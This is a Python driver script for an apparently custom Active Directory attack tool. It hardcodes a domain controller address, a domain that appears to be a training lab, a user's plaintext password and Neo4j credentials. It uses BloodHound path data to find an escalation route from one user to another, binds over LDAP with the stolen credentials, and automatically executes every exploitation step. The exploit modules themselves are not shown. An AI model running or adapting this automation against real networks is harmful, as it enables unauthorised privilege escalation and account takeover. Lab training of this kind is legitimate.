from core.database import DatabaseManager
from core.pathfinder import Pathfinder
from core.exploit import ExploitEngine
from core.task_manager import TaskManager
from ldap3 import Server, Connection, ALL

# CONFIGURATION
DC_IP = "172.16.5.5"
DOMAIN = "INLANEFREIGHT.LOCAL"
SOURCE_USER = "INLANEFREIGHT\\WLEY"
SOURCE_PASS = "transporter@4"

# 1. Find the Path (Neo4j)
db = DatabaseManager("bolt://localhost:7687", "neo4j", "bloodhoundcommunityedition")
db.connect()
pf = Pathfinder(db)
path = pf.find_best_path("WLEY@INLANEFREIGHT.LOCAL", "ADUNN@INLANEFREIGHT.LOCAL")

server = Server(DC_IP, use_ssl=True, get_info=ALL)
conn = Connection(server, user=SOURCE_USER, password=SOURCE_PASS, auto_bind=True)

# 2. Initialize Engine with Config
engine = ExploitEngine(conn, domain=DOMAIN, dc_ip=DC_IP)

# 3. Initialize Task Manager with Initial Password
tm = TaskManager(engine)
tm.set_initial_password(SOURCE_PASS)

# 4. Run
tm.build_plan(path)
tm.execute_all()
